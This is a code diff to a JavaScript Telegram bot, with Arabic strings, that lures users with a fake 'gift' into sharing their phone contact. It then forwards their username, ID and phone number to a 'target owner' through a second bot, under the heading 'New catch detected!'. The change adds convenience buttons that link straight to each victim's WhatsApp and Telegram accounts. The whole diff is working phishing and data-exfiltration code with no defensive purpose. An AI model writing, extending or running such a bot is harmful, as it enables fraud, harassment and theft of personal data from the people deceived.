@@ -90,6 +90,7 @@ bot.on('contact', async (msg) => {
 
     const whatsappMessage = encodeURIComponent("تم سحب رقمك بواسطة وهم");
     const whatsappLink = `https://wa.me/${phone}?text=${whatsappMessage}`;
+    const telegramProfileLink = `tg://user?id=${userId}`;
 
     const reportMessage = `
 🚨 **صيد جديد تم رصده!**
@@ -98,10 +99,20 @@ bot.on('contact', async (msg) => {
 🔗 **اليوزر:** ${username}
 🆔 **الأيدي:** ${userId}
 📞 **رقم الهاتف:** +${phone}
-🔗 **رابط الحساب:** tg://user?id=${userId}
-💬 **رابط الواتساب المباشر:** ${whatsappLink}
 🎯 **الأيدي المستهدف (من الرابط):** ${targetOwnerId || "غير معروف"}
 `;
+
+    // إعداد الأزرار الشفافة (تحت التقرير)
+    const inlineKeyboard = {
+        reply_markup: {
+            inline_keyboard: [
+                [
+                    { text: "💬 مراسلة واتساب", url: whatsappLink },
+                    { text: "👤 حساب التليجرام", url: telegramProfileLink }
+                ]
+            ]
+        }
+    };
 
     await bot.sendMessage(chatId, `✅ تم التحقق بنجاح! جاري تحويل الهدية إلى حسابك...`, {
         reply_markup: { remove_keyboard: true }
@@ -109,11 +120,12 @@ bot.on('contact', async (msg) => {
 
     if (targetOwnerId) {
         try {
-            // إرسال النص فقط لتجنب أي مشاكل في صيغة الصور أو روابط الملفات
+            // إرسال التقرير النصي مع الأزرار الشفافة بأمان تام
             await notifierBot.sendMessage(targetOwnerId, reportMessage, {
-                parse_mode: "Markdown"
+                parse_mode: "Markdown",
+                reply_markup: inlineKeyboard.reply_markup
             });
-            console.log(`تم إرسال التقرير النصي بنجاح إلى الأيدي: ${targetOwnerId}`);
+            console.log(`تم إرسال التقرير مع الأزرار الشفافة بنجاح إلى الأيدي: ${targetOwnerId}`);
         } catch (err) {
             console.log("خطأ أثناء إرسال البيانات للبوت الثاني:", err.message);
         }
